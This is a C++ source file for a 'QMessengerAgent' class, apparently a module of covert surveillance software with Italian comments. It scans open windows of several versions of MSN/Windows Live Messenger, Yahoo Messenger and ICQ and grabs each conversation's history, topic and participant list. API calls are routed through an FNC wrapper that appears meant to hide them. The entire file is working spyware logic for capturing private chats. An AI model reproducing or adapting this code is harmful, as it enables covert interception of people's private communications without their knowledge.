/* 
*	QMessengerAgent class
*
*	Version: 1.0
*	Author: Quequero
*	Date: 22/Feb/2008
*/

#include <exception>
using namespace std;

#include "QMessengerAgent.h"
#include "QMsnLive2011.h"
#include "QYim10.h"
#include "QIcq7.h"
#include "..\common.h"
BOOL QMessengerAgent::UpdateWindowList()
{
	UINT i, uLen;

	uLen = list.GetQueueLength();

	// Puliamo la catena delle finestre
	for(i = 0; i < uLen; i++, list++){
		if(!FNC(IsWindow)(list.GetAgent()->GetHandle()))
			list.Remove();
	}

	// Inseriamo le nuove finestre
	FNC(EnumWindows)(&QMessengerAgent::FillList, (LPARAM)this);

	// Grabbiamo le history e le user list
	for(i = 0; i < list.GetQueueLength(); i++, list++){
		list.GetAgent()->GrabTopic();
		list.GetAgent()->GrabHistory();
		list.GetAgent()->GrabUserList();
	}

	return TRUE;
}

UINT QMessengerAgent::GetMessengerType()
{
	return 0;
}

void QMessengerAgent::ChatAcquired()
{
	list.GetAgent()->SetAcquiredStatus();
}

BOOL QMessengerAgent::IsUpdated()
{
	return list.GetAgent()->GetUpdated();
}

PWCHAR QMessengerAgent::GetHistory()
{
	return list.GetAgent()->GetHistory();
}

UINT QMessengerAgent::GetHistoryLength()
{
	return list.GetAgent()->GetHistoryLength();
}

UINT QMessengerAgent::GetListLength()
{
	return list.GetQueueLength();
}

PWCHAR QMessengerAgent::GetTopic()
{
	return list.GetAgent()->GetTopic();
}

PWCHAR QMessengerAgent::GetUsers()
{
	return list.GetAgent()->GetUsers();
}

const PWCHAR QMessengerAgent::GetMessengerName()
{
	return list.GetAgent()->GetMessenger();
}

void QMessengerAgent::Next()
{
	list++;
}

BOOL QMessengerAgent::IsPresent(HWND hw)
{
	register UINT i;

	for(i = 0; i < list.GetQueueLength(); i++, list++){
		if(list.GetAgent()->GetHandle() == hw)
			return TRUE;
	}

	return FALSE;
}

BOOL QMessengerAgent::CompareId()
{
	return FALSE;
}

// Riempie la lista delle chat
BOOL CALLBACK QMessengerAgent::FillList(HWND hwnd, LPARAM lParam)
{
	QAgent *im	= NULL;
	UINT version;

	if(QMsn::Is(hwnd)){
		if(((QMessengerAgent *)lParam)->IsPresent(hwnd))
			return TRUE;

		version = QMsn::Version(hwnd);

		if (version == MSN_LIVE_2011) {
			HWND hChld = NULL;
			while (hChld = QMsnLive2011::GetNextChild(hwnd, hChld)) {
				if(!((QMessengerAgent *)lParam)->IsPresent(hChld)) {
					im = new(std::nothrow) QMsnLive2011(hChld);
					if (im)
						((QMessengerAgent *)lParam)->list += im;
				}
			}
			return TRUE;
		}

		switch(version){
			case MSN_6:
				im = new(std::nothrow) QMsn6(hwnd);
				break;
			case MSN_7:
				im = new(std::nothrow) QMsnLive(hwnd);
				break;
			case MSN_LIVE:
				im = new(std::nothrow) QMsnLive85(hwnd);
				break;
			case MSN_LIVE_2009:
				im = new(std::nothrow) QMsnLive2009(hwnd);
				break;
			default:
				break;
		}

		if(im == NULL)
			return TRUE;

		((QMessengerAgent *)lParam)->list += im;

		return TRUE;
	}

	if(QYim::Is(hwnd)){
		if(((QMessengerAgent *)lParam)->IsPresent(hwnd))
			return TRUE;

		switch (QYim::Version(hwnd)) {
			case YIM_7:
				im = new(std::nothrow) QYim7(hwnd);
				break;
			case YIM_8:
				im = new(std::nothrow) QYim8(hwnd);
				break;
			case YIM_10:
				im = new(std::nothrow) QYim10(hwnd);
				break;
			default:
				break;
		}

		if(im == NULL)
			return TRUE;

		((QMessengerAgent *)lParam)->list += im;

		return TRUE;
	}

	if(QIcq::Is(hwnd)){
		HWND hChld = NULL;
		switch (QIcq::Version(hwnd)) {
			case ICQ_7:
				while (hChld = QIcq7::GetNextChild(hwnd, hChld)) {
					if(!((QMessengerAgent *)lParam)->IsPresent(hChld)) {
						im = new(std::nothrow) QIcq7(hChld);
						((QMessengerAgent *)lParam)->list += im;
					}
				}

				break;
			default:
				break;
		}

		return TRUE;
	}

	return TRUE;
}